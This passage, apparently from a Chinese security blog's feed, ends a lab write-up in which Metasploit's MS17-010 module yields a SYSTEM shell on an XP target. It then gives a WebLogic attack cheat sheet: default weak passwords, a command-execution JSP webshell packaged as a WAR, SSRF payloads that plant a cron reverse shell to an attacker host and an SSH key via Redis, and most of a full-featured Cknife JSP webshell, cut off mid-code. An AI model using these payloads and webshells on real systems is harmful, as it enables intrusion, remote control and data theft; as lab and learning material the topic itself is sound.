<span class="token operator">|</span>   challenge_response: supported
<span class="token operator">|</span>_  message_signing: disabled <span class="token punctuation">(</span>dangerous, but default<span class="token punctuation">)</span>
<span class="token operator">|</span>_smb2-time: Protocol negotiation failed <span class="token punctuation">(</span>SMB2<span class="token punctuation">)</span>
<span class="token operator">|</span>_nbstat: NetBIOS name: EXPERIENCE, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:f8:3c:9d <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.32</span> ms <span class="token number">192.168</span>.56.198

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">35.38</span> seconds</code></pre>
<p>只有SMB服务，好老的版本，还是个xp，看着就感觉像像永恒之蓝,搜一下漏洞。</p>
<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"> nmap <span class="token parameter variable">--script</span> vuln <span class="token parameter variable">-p445</span> <span class="token variable">$IP</span>           
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-16 <span class="token number">23</span>:06 CST
Pre-scan script results:
<span class="token operator">|</span> broadcast-avahi-dos: 
<span class="token operator">|</span>   Discovered hosts:
<span class="token operator">|</span>     <span class="token number">224.0</span>.0.251
<span class="token operator">|</span>   After NULL UDP avahi packet DoS <span class="token punctuation">(</span>CVE-2011-1002<span class="token punctuation">)</span>.
<span class="token operator">|</span>_  Hosts are all up <span class="token punctuation">(</span>not vulnerable<span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.198
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00028s latency<span class="token punctuation">)</span>.

PORT    STATE SERVICE
<span class="token number">445</span>/tcp <span class="token function">open</span>  microsoft-ds
MAC Address: 08:00:27:F8:3C:9D <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Host script results:
<span class="token operator">|</span>_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
<span class="token operator">|</span> smb-vuln-cve2009-3103: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   SMBv2 exploit <span class="token punctuation">(</span>CVE-2009-3103, Microsoft Security Advisory <span class="token number">975497</span><span class="token punctuation">)</span>
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2009-3103
<span class="token operator">|</span>           Array index error <span class="token keyword">in</span> the SMBv2 protocol implementation <span class="token keyword">in</span> srv2.sys <span class="token keyword">in</span> Microsoft Windows Vista Gold, SP1, and SP2,
<span class="token operator">|</span>           Windows Server <span class="token number">2008</span> Gold and SP2, and Windows <span class="token number">7</span> RC allows remote attackers to execute arbitrary code or cause a
<span class="token operator">|</span>           denial of <span class="token function">service</span> <span class="token punctuation">(</span>system crash<span class="token punctuation">)</span> via an <span class="token operator">&amp;</span> <span class="token punctuation">(</span>ampersand<span class="token punctuation">)</span> character <span class="token keyword">in</span> a Process ID High header field <span class="token keyword">in</span> a NEGOTIATE
<span class="token operator">|</span>           PROTOCOL REQUEST packet, <span class="token function">which</span> triggers an attempted dereference of an out-of-bounds memory location,
<span class="token operator">|</span>           aka <span class="token string">"SMBv2 Negotiation Vulnerability."</span>
<span class="token operator">|</span>           
<span class="token operator">|</span>     Disclosure date: <span class="token number">2009</span>-09-08
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2009-3103
<span class="token operator">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2009-3103
<span class="token operator">|</span>_smb-vuln-ms10-061: ERROR: Script execution failed <span class="token punctuation">(</span>use <span class="token parameter variable">-d</span> to debug<span class="token punctuation">)</span>
<span class="token operator">|</span> smb-vuln-ms17-010: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   Remote Code Execution vulnerability <span class="token keyword">in</span> Microsoft SMBv1 servers <span class="token punctuation">(</span>ms17-010<span class="token punctuation">)</span>
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2017-0143
<span class="token operator">|</span>     Risk factor: HIGH
<span class="token operator">|</span>       A critical remote code execution vulnerability exists <span class="token keyword">in</span> Microsoft SMBv1
<span class="token operator">|</span>        servers <span class="token punctuation">(</span>ms17-010<span class="token punctuation">)</span>.
<span class="token operator">|</span>           
<span class="token operator">|</span>     Disclosure date: <span class="token number">2017</span>-03-14
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2017-0143
<span class="token operator">|</span>       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
<span class="token operator">|</span>_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
<span class="token operator">|</span> smb-vuln-ms08-067: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   Microsoft Windows system vulnerable to remote code execution <span class="token punctuation">(</span>MS08-067<span class="token punctuation">)</span>
<span class="token operator">|</span>     State: LIKELY VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2008-4250
<span class="token operator">|</span>           The Server <span class="token function">service</span> <span class="token keyword">in</span> Microsoft Windows <span class="token number">2000</span> SP4, XP SP2 and SP3, Server <span class="token number">2003</span> SP1 and SP2,
<span class="token operator">|</span>           Vista Gold and SP1, Server <span class="token number">2008</span>, and <span class="token number">7</span> Pre-Beta allows remote attackers to execute arbitrary
<span class="token operator">|</span>           code via a crafted RPC request that triggers the overflow during path canonicalization.
<span class="token operator">|</span>           
<span class="token operator">|</span>     Disclosure date: <span class="token number">2008</span>-10-23
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
<span class="token operator">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2008-4250
<span class="token operator">|</span>_smb-vuln-ms10-054: <span class="token boolean">false</span></code></pre>
<p>结果显示有ms17-010还有ms08-067</p>
<h2 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h2><pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lport <span class="token number">4567</span>
lport <span class="token operator">=</span><span class="token operator">></span> <span class="token number">4567</span>
msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.56.104:4567 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - Target OS: Windows <span class="token number">5.1</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - Filling barrel with fish<span class="token punctuation">..</span>. <span class="token keyword">done</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - <span class="token operator">&lt;</span>---------------- <span class="token operator">|</span> Entering Danger Zone <span class="token operator">|</span> ----------------<span class="token operator">></span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 -        <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Preparing dynamite<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 -                <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying stick <span class="token number">1</span> <span class="token punctuation">(</span>x86<span class="token punctuation">)</span><span class="token punctuation">..</span>.Boom<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 -        <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully Leaked Transaction<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 -        <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully caught Fish-in-a-barrel
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - <span class="token operator">&lt;</span>---------------- <span class="token operator">|</span> Leaving Danger Zone <span class="token operator">|</span> ----------------<span class="token operator">></span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - Reading from CONNECTION struct at: 0x863d0350
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - Built a write-what-where primitive<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - Overwrite complete<span class="token punctuation">..</span>. SYSTEM session obtained<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - Selecting native target
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - Uploading payload<span class="token punctuation">..</span>. fMxsOTmN.exe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - Created <span class="token punctuation">\</span>fMxsOTmN.exe<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - Service started successfully<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">176198</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.56.198
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.198:445 - Deleting <span class="token punctuation">\</span>fMxsOTmN.exe<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">2</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.56.104:4567 -<span class="token operator">></span> <span class="token number">192.168</span>.56.198:1039<span class="token punctuation">)</span> at <span class="token number">2024</span>-07-16 <span class="token number">23</span>:21:27 +0800

meterpreter <span class="token operator">></span> </code></pre>
<p>直接用ms17-010拿到shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">
C:<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>bill<span class="token punctuation">\</span>Desktop<span class="token operator">></span>type user.txt
<span class="token builtin class-name">type</span> user.txt
f9e24c8da0686680decee9e594178a2e 

C:<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>bill<span class="token punctuation">\</span>Desktop<span class="token operator">></span>type root.txt
<span class="token builtin class-name">type</span> root.txt
c1d5e7e4efece4a6022c4a4080c8114d </code></pre>
<p>知道是这个玩意就不下载了。</p>
]]></content>
      <categories>
        <category>Vulnyx</category>
      </categories>
      <tags>
        <tag>MS17-010</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic漏洞</title>
    <url>/posts/e9731bcd/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>WebLogic Server是美国甲骨文（Oracle）公司开发的一款适用于云环境和传统环境的应用服务中间件，确切的说是一个基于JavaEE架构的中间件，它提供了一个现代轻型开发平台，用于开发、集成、部署和管理大型分布式Web应用、网络应用和<br>数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<h1 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h1><p>默认端口：7001<br>Web界面: Error 404–Not Found<br>控制后台: <a href="http://ip:7001/console">http://ip:7001/console</a></p>
<h1 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h1><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><pre class="language-none"><code class="language-none">weblogic&#x2F;Oracle@123
system&#x2F;password
weblogic&#x2F;weblogic
admin&#x2F;security
joe&#x2F;password
mary&#x2F;password
system&#x2F;security
wlcsystem&#x2F;wlcsystem
wlpisystem&#x2F;wlpisystem</code></pre>
<h2 id="上传war包getshell"><a href="#上传war包getshell" class="headerlink" title="上传war包getshell"></a>上传war包getshell</h2><p>cmd.jsp</p>
<pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;java.io.*&quot; %&gt; &lt;% String cmd&#x3D;request.getParameter(&quot;cmd&quot;);String output&#x3D;&quot;&quot;;if(cmd!&#x3D;null) &#123; String s&#x3D;null;try &#123; Process p&#x3D;Runtime.getRuntime().exec(cmd); BufferedReader sI&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));while((s&#x3D;sI.readLine()) !&#x3D;null) &#123; output+&#x3D;s+&quot;\r\n&quot;; &#125; &#125;catch(IOExceptione) &#123; e.printStackTrace(); &#125; &#125;out.println(output);%&gt;</code></pre>
<p>打包war包</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">jar <span class="token parameter variable">-cvf</span> cmd.war cmd.jsp</code></pre>
<p>上传war包<br>getshell</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;cmd&#x2F;cmd.jsp?cmd&#x3D;ls</code></pre>
<h2 id="CVE-2014-4210"><a href="#CVE-2014-4210" class="headerlink" title="CVE-2014-4210"></a>CVE-2014-4210</h2><p>weblogic中存在SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而可以攻击内网中Redis，Fastcgi等组建<br>漏洞产生于&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp页面中，可以导致SSRF<br>探测内网存活</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;ip:port</code></pre>
<p>SSRF攻击内网Redis<br>写定时任务</p>
<pre class="language-none"><code class="language-none">&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?operator&#x3D;http:&#x2F;&#x2F;ip&#x2F;test%0D%0A%0D%0Aset%20x%20%22%5Cn%5Cn%5Cn%5Cn*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%20&gt;%26%20%2Fdev%2Ftcp%2Fvps%2Fport%200&gt;%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2Fcrontabs%2F%0D%0Aconfig%20set%20dbfilename%20root%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search</code></pre>
<p>写ssh公钥</p>
<pre class="language-none"><code class="language-none">uddiexplorer&#x2F;SearchPublicRegistries.jsp?
operator&#x3D;http:&#x2F;&#x2F;ip&#x2F;test%0D%0A%0D%0Aset%20xx%20%22
%5Cn%5Cn%5Cn%5Cnssh-rsa
%20AAAAB3NzaC1yc2EAAAADAQABAAABAQDV14i&#x2F;SITCBQjzb%2B8xL0vwGw
KjnMEQiarTxdVokFToK0Xw99m0eJwKV3WcTQgSykHA2rFxbQw%2Fv9IVx89bAz
X0iOBAU8jF%2B9oH5KE9KBzM%2FT1Vr3DDwmNny2qYCfizO9jJ90fr3DUeXWwl
%2BD24XiKfkDzlDly9LgEYxXl%2FCIgZ91QcTA0UeSBLXCgigVLKhDNZGGBqMF
rGNUsj0esNJr7pJsYEnIn%2BN5BtnUWEce1KERlGDiwvzRpyFvOKgQpEAiS%2B
R781GSsAsJsCQz8OFge6lx0iSMNZ6TWjkQYKlnTkQvzOo%2FZhINtItYziRXJK
mNQLdPpQ7OYo2WOQ4TIDFtR5%20root@iZuf6jc5pa52ijq06q5f1lZ%5Cn%5C
n%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Froot%2F.ssh%0D%0Acon
fig%20set%20dbfilename%20authorized_keys%0D%0Asave%0D%0A%0D%0A
aaa&amp;rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfo
r&#x3D;&amp;selfor&#x3D;Business%2Blocation&amp;btnSubmit&#x3D;Search</code></pre>
<h2 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h2><p>在Weblogic Web Service Test Page中存在一处任意文件上传漏洞，WebService Test Page在”生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意jsp文件，进而获取服务器权限.<br><strong>影响范围</strong><br>Oracle WebLogic Server<br><strong>版本</strong></p>
<pre class="language-none"><code class="language-none">10.3.6.0
12.1.3.0
12.2.1.2
12.2.1.3</code></pre>
<p><strong>影响页面</strong></p>
<pre class="language-none"><code class="language-none">&#x2F;ws_utc&#x2F;config.do
&#x2F;ws_utc&#x2F;begin.do</code></pre>
<p><strong>jsp大马</strong></p>
<pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@page import&#x3D;&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;
&lt;%!
    String Pwd &#x3D; &quot;Cknife&quot;;
    String cs &#x3D; &quot;UTF-8&quot;;
    
    String EC(String s) throws Exception &#123;
        return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);
    &#125;
    
    Connection GC(String s) throws Exception &#123;
        String[] x &#x3D; s.trim().split(&quot;choraheiheihei&quot;);
        Class.forName(x[0].trim());
        if(x[1].indexOf(&quot;jdbc:oracle&quot;)!&#x3D;-1)&#123;
            return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[&#x2F;null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[&#x2F;null]&quot;)?&quot;&quot;:x[3]);
        &#125;else&#123;
            Connection c &#x3D; DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[&#x2F;null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[&#x2F;null]&quot;)?&quot;&quot;:x[3]);
            if (x.length &gt; 4) &#123;
                c.setCatalog(x[4]);
            &#125;
            return c;
        &#125;
    &#125;
    
    void AA(StringBuffer sb) throws Exception &#123;
        File k &#x3D; new File(&quot;&quot;);
        File r[] &#x3D; k.listRoots();
        for (int i &#x3D; 0; i &lt; r.length; i++) &#123;
            sb.append(r[i].toString().substring(0, 2));
        &#125;
    &#125;
    
    void BB(String s, StringBuffer sb) throws Exception &#123;
        File oF &#x3D; new File(s), l[] &#x3D; oF.listFiles();
        String sT, sQ, sF &#x3D; &quot;&quot;;
        java.util.Date dt;
        SimpleDateFormat fm &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);
        for (int i &#x3D; 0; i &lt; l.length; i++) &#123;
            dt &#x3D; new java.util.Date(l[i].lastModified());
            sT &#x3D; fm.format(dt);
            sQ &#x3D; l[i].canRead() ? &quot;R&quot; : &quot;&quot;;
            sQ +&#x3D; l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;
            if (l[i].isDirectory()) &#123;
                sb.append(l[i].getName() + &quot;&#x2F;\t&quot; + sT + &quot;\t&quot; + l[i].length()+ &quot;\t&quot; + sQ + &quot;\n&quot;);
            &#125; else &#123;
                sF+&#x3D;l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;+ sQ + &quot;\n&quot;;
            &#125;
        &#125;
        sb.append(sF);
    &#125;
    
    void EE(String s) throws Exception &#123;
        File f &#x3D; new File(s);
        if (f.isDirectory()) &#123;
            File x[] &#x3D; f.listFiles();
            for (int k &#x3D; 0; k &lt; x.length; k++) &#123;
                if (!x[k].delete()) &#123;
                    EE(x[k].getPath());
                &#125;
            &#125;
        &#125;
        f.delete();
    &#125;
    
    void FF(String s, HttpServletResponse r) throws Exception &#123;
        int n;
        byte[] b &#x3D; new byte[512];
        r.reset();
        ServletOutputStream os &#x3D; r.getOutputStream();
        BufferedInputStream is &#x3D; new BufferedInputStream(new FileInputStream(s));
        os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);
        while ((n &#x3D; is.read(b, 0, 512)) !&#x3D; -1) &#123;
            os.write(b, 0, n);
        &#125;
        os.write((&quot;|&quot; + &quot;&lt;-&quot;).getBytes(), 0, 3);
        os.close();
        is.close();
    &#125;
    
    void GG(String s, String d) throws Exception &#123;
        String h &#x3D; &quot;0123456789ABCDEF&quot;;
        File f &#x3D; new File(s);
        f.createNewFile();
        FileOutputStream os &#x3D; new FileOutputStream(f);
        for (int i &#x3D; 0; i &lt; d.length(); i +&#x3D; 2) &#123;
            os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i + 1))));
        &#125;
        os.close();
    &#125;
    
    void HH(String s, String d) throws Exception &#123;
        File sf &#x3D; new File(s), df &#x3D; new File(d);
        if (sf.isDirectory()) &#123;
            if (!df.exists()) &#123;
                df.mkdir();
            &#125;
            File z[] &#x3D; sf.listFiles();
            for (int j &#x3D; 0; j &lt; z.length; j++) &#123;
                HH(s + &quot;&#x2F;&quot; + z[j].getName(), d + &quot;&#x2F;&quot; + z[j].getName());
            &#125;
        &#125; else &#123;
            FileInputStream is &#x3D; new FileInputStream(sf);
            FileOutputStream os &#x3D; new FileOutputStream(df);
            int n;
            byte[] b &#x3D; new byte[512];
            while ((n &#x3D; is.read(b, 0, 512)) !&#x3D; -1) &#123;
                os.write(b, 0, n);
            &#125;
            is.close();
            os.close();
        &#125;
    &#125;
    
    void II(String s, String d) throws Exception &#123;
        File sf &#x3D; new File(s), df &#x3D; new File(d);
        sf.renameTo(df);
    &#125;
    
    void JJ(String s) throws Exception &#123;
        File f &#x3D; new File(s);
        f.mkdir();
    &#125;
    
    void KK(String s, String t) throws Exception &#123;
        File f &#x3D; new File(s);
        SimpleDateFormat fm &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);
        java.util.Date dt &#x3D; fm.parse(t);
        f.setLastModified(dt.getTime());
    &#125;
    
    void LL(String s, String d) throws Exception &#123;
        URL u &#x3D; new URL(s);
        int n &#x3D; 0;
        FileOutputStream os &#x3D; new FileOutputStream(d);
        HttpURLConnection h &#x3D; (HttpURLConnection) u.openConnection();
        InputStream is &#x3D; h.getInputStream();
        byte[] b &#x3D; new byte[512];
        while ((n &#x3D; is.read(b)) !&#x3D; -1) &#123;
            os.write(b, 0, n);
        &#125;
        os.close();
        is.close();
        h.disconnect();
    &#125;
    
    void MM(InputStream is, StringBuffer sb) throws Exception &#123;
        String l;
        BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(is));
        while ((l &#x3D; br.readLine()) !&#x3D; null) &#123;
            sb.append(l + &quot;\r\n&quot;);
        &#125;
    &#125;
    
    void NN(String s, StringBuffer sb) throws Exception &#123;
        Connection c &#x3D; GC(s);
        ResultSet r &#x3D; s.indexOf(&quot;jdbc:oracle&quot;)!&#x3D;-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();
        while (r.next()) &#123;
            sb.append(r.getString(1) + &quot;\t|\t\r\n&quot;);
        &#125;
        r.close();
        c.close();
    &#125;
    
    void OO(String s, StringBuffer sb) throws Exception &#123;
        Connection c &#x3D; GC(s);
        String[] x &#x3D; s.trim().split(&quot;choraheiheihei&quot;);
        ResultSet r &#x3D; c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!&#x3D;-1?x.length&gt;5?x[5]:x[4]:null, &quot;%&quot;, new String[]&#123;&quot;TABLE&quot;&#125;);
        while (r.next()) &#123;
            sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t|\t\r\n&quot;);
        &#125;
        r.close();
        c.close();
    &#125;
    
    void PP(String s, StringBuffer sb) throws Exception &#123;
        String[] x &#x3D; s.trim().split(&quot;\r\n&quot;);
        Connection c &#x3D; GC(s);
        Statement m &#x3D; c.createStatement(1005, 1007);
        ResultSet r &#x3D; m.executeQuery(&quot;select * from &quot; + x[x.length-1]);
        ResultSetMetaData d &#x3D; r.getMetaData();
        for (int i &#x3D; 1; i &lt;&#x3D; d.getColumnCount(); i++) &#123;
            sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)+ &quot;)\t&quot;);
        &#125;
        r.close();
        m.close();
        c.close();
    &#125;
    
    void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception &#123;
        Connection c &#x3D; GC(s);
        Statement m &#x3D; c.createStatement(1005, 1008);
        BufferedWriter bw &#x3D; null;
        try &#123;
            ResultSet r &#x3D; m.executeQuery(q.indexOf(&quot;--f:&quot;)!&#x3D;-1?q.substring(0,q.indexOf(&quot;--f:&quot;)):q);
            ResultSetMetaData d &#x3D; r.getMetaData();
            int n &#x3D; d.getColumnCount();
            for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;
                sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);
            &#125;
            sb.append(&quot;\r\n&quot;);
            if(q.indexOf(&quot;--f:&quot;)!&#x3D;-1)&#123;
                File file &#x3D; new File(p);
                if(q.indexOf(&quot;-to:&quot;)&#x3D;&#x3D;-1)&#123;
                    file.mkdir();
                &#125;
                bw &#x3D; new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!&#x3D;-1?p.trim():p+q.substring(q.indexOf(&quot;--f:&quot;) + 4,q.length()).trim()),true),cs));
            &#125;
            while (r.next()) &#123;
                for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;
                    if(q.indexOf(&quot;--f:&quot;)!&#x3D;-1)&#123;
                        bw.write(r.getObject(i)+&quot;&quot;+&quot;\t&quot;);
                        bw.flush();
                    &#125;else&#123;
                        sb.append(r.getObject(i)+&quot;&quot; + &quot;\t|\t&quot;);
                    &#125;
                &#125;
                if(bw!&#x3D;null)&#123;bw.newLine();&#125;
                sb.append(&quot;\r\n&quot;);
            &#125;
            r.close();
            if(bw!&#x3D;null)&#123;bw.close();&#125;
        &#125; catch (Exception e) &#123;
            sb.append(&quot;Result\t|\t\r\n&quot;);
            try &#123;
                m.executeUpdate(q);
                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);
            &#125; catch (Exception ee) &#123;
                sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);
            &#125;
        &#125;
        m.close();
        c.close();
    &#125;
%&gt;
&lt;%
 
 
&#x2F;&#x2F;String Z &#x3D; EC(request.getParameter(Pwd) + &quot;&quot;, cs);
    
    cs &#x3D; request.getParameter(&quot;code&quot;) !&#x3D; null ? request.getParameter(&quot;code&quot;)+ &quot;&quot;:cs;
    request.setCharacterEncoding(cs);
    response.setContentType(&quot;text&#x2F;html;charset&#x3D;&quot; + cs);
    StringBuffer sb &#x3D; new StringBuffer(&quot;&quot;);
if (request.getParameter(Pwd) !&#x3D; null) &#123;
 
    try &#123;
        String Z &#x3D; EC(request.getParameter(&quot;action&quot;) + &quot;&quot;);
        String z1 &#x3D; EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;);
        String z2 &#x3D; EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;);
        sb.append(&quot;-&gt;&quot; + &quot;|&quot;);
        String s &#x3D; request.getSession().getServletContext().getRealPath(&quot;&#x2F;&quot;);
        if (Z.equals(&quot;A&quot;)) &#123;
            sb.append(s + &quot;\t&quot;);
            if (!s.substring(0, 1).equals(&quot;&#x2F;&quot;)) &#123;
                AA(sb);
            &#125;
        &#125; else if (Z.equals(&quot;B&quot;)) &#123;
            BB(z1, sb);
        &#125; else if (Z.equals(&quot;C&quot;)) &#123;
            String l &#x3D; &quot;&quot;;
            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));
            while ((l &#x3D; br.readLine()) !&#x3D; null) &#123;
                sb.append(l + &quot;\r\n&quot;);
            &#125;
            br.close();
        &#125; else if (Z.equals(&quot;D&quot;)) &#123;
            BufferedWriter bw &#x3D; new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
            bw.write(z2);
            bw.close();
            sb.append(&quot;1&quot;);
        &#125; else if (Z.equals(&quot;E&quot;)) &#123;
            EE(z1);
            sb.append(&quot;1&quot;);
        &#125; else if (Z.equals(&quot;F&quot;)) &#123;
            FF(z1, response);
        &#125; else if (Z.equals(&quot;G&quot;)) &#123;
            GG(z1, z2);
            sb.append(&quot;1&quot;);
        &#125; else if (Z.equals(&quot;H&quot;)) &#123;
            HH(z1, z2);
            sb.append(&quot;1&quot;);
        &#125; else if (Z.equals(&quot;I&quot;)) &#123;
            II(z1, z2);
            sb.append(&quot;1&quot;);
        &#125; else if (Z.equals(&quot;J&quot;)) &#123;
            JJ(z1);
